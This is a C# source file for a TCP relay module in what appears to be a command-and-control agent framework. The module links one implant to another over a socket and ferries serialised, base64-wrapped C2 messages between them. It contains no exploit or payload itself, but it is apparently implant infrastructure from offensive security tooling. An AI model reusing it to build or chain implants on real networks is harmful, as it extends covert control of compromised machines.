using System;
using System.Threading;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Collections.Generic;

using C2.Models;

using Agent.Interfaces;
using Agent.Controllers;
using Agent.Models;

namespace Agent.Modules
{
    public class TCPRelay : ICommRelay
    {
        protected ConfigController ConfigController { get; set; }

        protected Queue<AgentMessage> inboundQueue = new Queue<AgentMessage>();
        protected Queue<AgentMessage> outboundQueue = new Queue<AgentMessage>();
        protected CancellationTokenSource cancellationToken;

        public TCPRelay(ConfigController ConfigController)
        {
            this.ConfigController = ConfigController;
        }

        public bool GarbageOut(out AgentMessage message)
        {
            if (inboundQueue.Count > 0)
            {
                message = inboundQueue.Dequeue();
                return true;
            }

            message = null;
            return false;
        }

        public void GarbageIn(AgentMessage message)
        {
            outboundQueue.Enqueue(message);
        }

        public void LinkTCPAgent(TcpAgent tcpAgent)
        {
            GenerateLinkRequest();

            cancellationToken = new CancellationTokenSource();
            var ct = cancellationToken.Token;

            Task.Factory.StartNew(delegate ()
            {
                var tcpClient = new TcpClient();
                try
                {
                    tcpClient.Connect(tcpAgent.Address, tcpAgent.Port);
                }
                catch
                {
                    outboundQueue.Dequeue();
                    return;
                }

                var buffer = new byte[tcpClient.ReceiveBufferSize];
                while (true)
                {
                    if (ct.IsCancellationRequested) { return; }

                    var stream = tcpClient.GetStream();
                    stream.ReadTimeout = 500;

                    if (outboundQueue.Count > 0)
                    {
                        try
                        {
                            var messageOut = C2.Helpers.Serialise(outboundQueue.Dequeue());
                            stream.Write(messageOut, 0, messageOut.Length);
                        }
                        catch { continue; }
                    }

                    try
                    {
                        stream.Read(buffer, 0, buffer.Length);
                        var data = C2.Helpers.Prune(buffer);
                        var messageIn = C2.Helpers.Deserialise<AgentMessage>(data);
                        inboundQueue.Enqueue(messageIn);
                        Array.Clear(buffer, 0, buffer.Length);
                    }
                    catch { continue; }
                }
            }, ct);
        }

        public void Stop()
        {
            cancellationToken.Cancel();
        }

        private void GenerateLinkRequest()
        {
            var c2Data = new C2Data
            {
                Module = "Stage",
                Command = "Link",
                Data = (string)ConfigController.GetOption(Models.ConfigurationSettings.AgentId)
            };

            var message = new AgentMessage
            {
                Data = Convert.ToBase64String(C2.Helpers.Serialise(c2Data))
            };

            outboundQueue.Enqueue(message);
        }
    }
}